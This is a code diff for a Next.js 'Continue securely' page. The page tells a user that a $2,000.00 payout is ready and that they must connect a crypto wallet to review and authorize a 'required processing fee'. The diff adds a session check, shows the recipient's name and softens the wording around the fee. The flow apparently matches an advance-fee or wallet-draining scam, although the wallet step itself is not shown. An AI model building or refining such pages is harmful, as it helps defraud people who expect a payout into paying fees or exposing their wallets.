@@ -1,17 +1,12 @@
-"use client";
-
-import { useState } from "react";
+import { redirect } from "next/navigation";
+import { getSession } from "@/lib/session";
 import styles from "./continue.module.css";
 
-export default function ContinuePage() {
-  const [loading, setLoading] = useState(false);
+export default async function ContinuePage() {
+  const session = await getSession();
 
-  function handleContinue() {
-    setLoading(true);
-
-    window.setTimeout(() => {
-      window.location.href = "/wallet";
-    }, 500);
+  if (!session) {
+    redirect("/access");
   }
 
   return (
@@ -25,12 +20,18 @@ export default function ContinuePage() {
           <h1>Continue securely</h1>
 
           <p className={styles.description}>
-            Your payout details have been reviewed. The next step is to
-            connect a compatible wallet so the required processing fee can be
-            authorized.
+            Your payout details are ready for review. The next
+            step is to connect a compatible wallet so you can
+            review the required processing fee before any
+            transaction is authorized.
           </p>
 
           <div className={styles.summary}>
+            <div>
+              <span>Recipient</span>
+              <strong>{session.recipientName}</strong>
+            </div>
+
             <div>
               <span>Payout</span>
               <strong>$2,000.00</strong>
@@ -47,22 +48,21 @@ export default function ContinuePage() {
             </div>
           </div>
 
-          <button
-            type="button"
+          <a
+            href="/wallet"
             className={styles.button}
-            onClick={handleContinue}
-            disabled={loading}
           >
-            {loading ? "Preparing secure connection…" : "Connect wallet"}
-            {!loading && <span>→</span>}
-          </button>
+            Connect wallet
+            <span>→</span>
+          </a>
 
           <p className={styles.note}>
-            Connecting a wallet does not authorize or send the processing fee.
-            Any transaction requires a separate confirmation in your wallet.
+            Connecting a wallet does not authorize or send the
+            processing fee. Any transaction requires a separate
+            review and confirmation in your wallet.
           </p>
         </div>
       </section>
     </main>
   );
-}
+              }
